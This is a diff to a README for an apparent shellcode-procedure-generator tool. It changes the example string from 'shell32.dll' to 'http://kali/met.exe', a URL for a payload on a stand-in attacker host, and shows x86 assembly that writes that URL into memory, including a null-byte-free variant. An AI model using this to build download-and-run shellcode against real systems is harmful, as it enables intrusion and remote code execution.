@@ -95,34 +95,42 @@ load_lib:  ;# load the shell32.dll DLL
 To generate instructions for writing an ASCII string to memory:
 
 ```bash
-$ shellcode-procedure-generator --write --ascii-string "shell32.dll" --write-addr "[ebp-0x50]"
-write_str: ;# write shell32.dll to [ebp-0x50]
+$ shellcode-procedure-generator --write --ascii-string "http://kali/met.exe" --write-addr "[ebp-0x50]" 
+write_str: ;# write http://kali/met.exe to [ebp-0x50]
   xor eax, eax  ;# NULL EAX
   xor ecx, ecx  ;# NULL ECX
-  mov eax, [ebp-0x50] ;# Load the address to write to into EAX
-  mov ecx, 0x006c6c64 ;# Move the part "lld." of the string "shell32.dll" to ECX
-  mov [eax], ecx ;# Write the part "lld." of the string "shell32.dll" to memory
-  mov ecx, 0x2e32336c ;# Move the part "23ll" of the string "shell32.dll" to ECX
-  mov [eax+0x04], ecx ;# Write the part "23ll" of the string "shell32.dll" to memory
-  mov ecx, 0x6c656873 ;# Move the part "ehs" of the string "shell32.dll" to ECX
-  mov [eax+0x08], ecx ;# Write the part "ehs" of the string "shell32.dll" to memory
+  lea eax, [ebp-0x50] ;# Load the address to write to into EAX
+  mov ecx, 0x70747468 ;# Move the part "http" of the string "http://kali/met.exe" to ECX
+  mov [eax], ecx ;# Write the part "http" of the string "http://kali/met.exe" to memory
+  mov ecx, 0x6b2f2f3a ;# Move the part "://k" of the string "http://kali/met.exe" to ECX
+  mov [eax+0x04], ecx ;# Write the part "://k" of the string "http://kali/met.exe" to memory
+  mov ecx, 0x2f696c61 ;# Move the part "ali/" of the string "http://kali/met.exe" to ECX
+  mov [eax+0x08], ecx ;# Write the part "ali/" of the string "http://kali/met.exe" to memory
+  mov ecx, 0x2e74656d ;# Move the part "met." of the string "http://kali/met.exe" to ECX
+  mov [eax+0x0c], ecx ;# Write the part "met." of the string "http://kali/met.exe" to memory
+  mov ecx, 0x00657865 ;# Move the part "exe" of the string "http://kali/met.exe" to ECX
+  mov [eax+0x10], ecx ;# Write the part "exe" of the string "http://kali/met.exe" to memory
 ```
 
 To do the same, but escape the NULL byte:
 
 ```bash
-$ shellcode-procedure-generator --write --ascii-string "shell32.dll" --write-addr "[ebp-0x50]" --null-free
-write_str: ;# write shell32.dll to [ebp-0x50]
+$ shellcode-procedure-generator --write --ascii-string "http://kali/met.exe" --write-addr "[ebp-0x50]"  --null-free
+write_str: ;# write http://kali/met.exe to [ebp-0x50]
   xor eax, eax  ;# NULL EAX
   xor ecx, ecx  ;# NULL ECX
-  mov eax, [ebp-0x50] ;# Load the address to write to into EAX
-  mov ecx, 0xff93939c ;# Move the negated value of the part "lld." of the string "shell32.dll" to ECX to avoid NULL bytes
+  lea eax, [ebp-0x50] ;# Load the address to write to into EAX
+  mov ecx, 0x70747468 ;# Move the part "http" of the string "http://kali/met.exe" to ECX
+  mov [eax], ecx ;# Write the part "http" of the string "http://kali/met.exe" to memory
+  mov ecx, 0x6b2f2f3a ;# Move the part "://k" of the string "http://kali/met.exe" to ECX
+  mov [eax+0x04], ecx ;# Write the part "://k" of the string "http://kali/met.exe" to memory
+  mov ecx, 0x2f696c61 ;# Move the part "ali/" of the string "http://kali/met.exe" to ECX
+  mov [eax+0x08], ecx ;# Write the part "ali/" of the string "http://kali/met.exe" to memory
+  mov ecx, 0x2e74656d ;# Move the part "met." of the string "http://kali/met.exe" to ECX
+  mov [eax+0x0c], ecx ;# Write the part "met." of the string "http://kali/met.exe" to memory
+  mov ecx, 0xff9a879b ;# Move the negated value of the part "exe" of the string "http://kali/met.exe" to ECX to avoid NULL bytes
   neg ecx ;# Negate ECX to get the original value
-  mov [eax], ecx ;# Write the part "lld." of the string "shell32.dll" to memory
-  mov ecx, 0x2e32336c ;# Move the part "23ll" of the string "shell32.dll" to ECX
-  mov [eax+0x04], ecx ;# Write the part "23ll" of the string "shell32.dll" to memory
-  mov ecx, 0x6c656873 ;# Move the part "ehs" of the string "shell32.dll" to ECX
-  mov [eax+0x08], ecx ;# Write the part "ehs" of the string "shell32.dll" to memory
+  mov [eax+0x10], ecx ;# Write the part "exe" of the string "http://kali/met.exe" to memory
 ```
 
 Calculate a hash of the given input string:
